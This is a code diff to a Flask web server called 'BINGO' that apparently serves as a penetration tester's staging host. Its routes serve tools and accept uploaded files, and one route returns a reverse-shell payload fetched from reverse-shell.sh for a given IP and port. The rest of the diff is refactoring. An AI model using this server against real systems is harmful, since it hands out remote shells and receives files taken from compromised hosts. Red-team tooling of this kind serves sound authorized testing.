@@ -1,3 +1,4 @@
+#! /usr/bin/python3
 from flask import Flask, request, send_file, make_response, jsonify
 import io
 import requests
@@ -9,32 +10,23 @@ import sys
 import os
 
 from src.loadconfig import load_config
+from src.makeup import colors, fonts
+from bluepints.bashupload import FileUpload, random_string
 
+myconfig = load_config('config.yaml')
 
-colors = ['red',
-    'yellow',
-    'green',
-    'cyan',
-    'blue',
-    'magenta',
-]
-fonts = ['smslant',
-    'crawford',
-    'cursive',
-    'pyramid',
-    'stacey',
-    'slant',
-    '5lineoblique',
-    'ticks',
-    'contessa',
-    'hex',
-    'pawp',
-    'block',
-    'graffiti',
-    'linux',
-    'charact3',
-    'bulbhead',
-]
+def documentation():
+    text = """
+    BINGO, simple python web server
+    rotes:
+    /upload - upload file
+    /download - download file
+    /revshell - get revshell
+    /get - get file
+    /search - search file
+    
+    
+    """
 
 def make_banner():
     print(colored(pyfiglet.figlet_format("bingo", font=choice(fonts)), choice(colors)))
@@ -50,13 +42,23 @@ def download_binary_from_url(url, binary_name):
 def get_rev_shell(ip, port):
     return get_raw_url_response(f'https://reverse-shell.sh/{ip}:{port}')
 
-static_folder = os.getcwd()
+if myconfig['config']['file_download']:
+    file_download = True
+    static_folder = './uploads'
+else:
+    static_folder = './static'
+
 app = Flask(__name__, static_url_path='/', static_folder=static_folder)
 
-myconfig = load_config('config.yaml')
+## ver
+if myconfig['config']['file_download']:
+    @app.route('/download/<filename>')
+    def download_file(filename):
+        return download_binary_from_url(f'http://{myconfig["config"]["host"]}:{myconfig["config"]["port"]}/uploads/{filename}', filename)
 
 @app.route('/')
 def banner():
+    response_content = ''
     response = make_response(pyfiglet.figlet_format("bingo", font=choice(fonts)), 200)
     response.mimetype = "text/plain"
     return response
@@ -65,7 +67,7 @@ def banner():
 def search(keyword) -> dict:
     output = []
     for program in myconfig['program']:
-        if keyword in program:
+        if keyword in program['name']:
             program_dict = {
                 'name': program,
                 'type': myconfig['program'][program]['type'],
@@ -89,12 +91,27 @@ def get(program_name):
 
 @app.route('/revshell/<ip>/<port>', methods=['GET'])
 def revshell(ip, port):
-    return get_raw_url_response(f'https://reverse-shell.sh/{ip}:{port}')
+    return get_rev_shell(ip, port)
+
+@app.route('/upload/<filename>', methods=['PUT'])
+def upload(filename):
+    if request.stream:
+        random_filename = f'{random_string(5)}_{filename}'
+        file = FileUpload(random_filename, request.stream.read())
+        file.save()
+        if myconfig['config']['file_download']:
+            return f'(⌐■_■) "{filename}" saved successfully! Access it at /uploads/{random_filename}'
+        else:
+            return f'(⌐■_■) "{filename}" saved successfully! ({random_filename}) But file download is disabled in config file ToT'
+
+@app.errorhandler(404)
+def page_not_found(e):
+    return banner() 
 
 if __name__ == '__main__':
     cli = sys.modules['flask.cli']
     cli.show_server_banner = lambda *x: None
-    
+    port = myconfig['config']['port']
+    host = myconfig['config']['host']
     make_banner()
-    
-    app.run(port='5000', host='0.0.0.0', debug=False)
+    app.run(port=port, host=host)
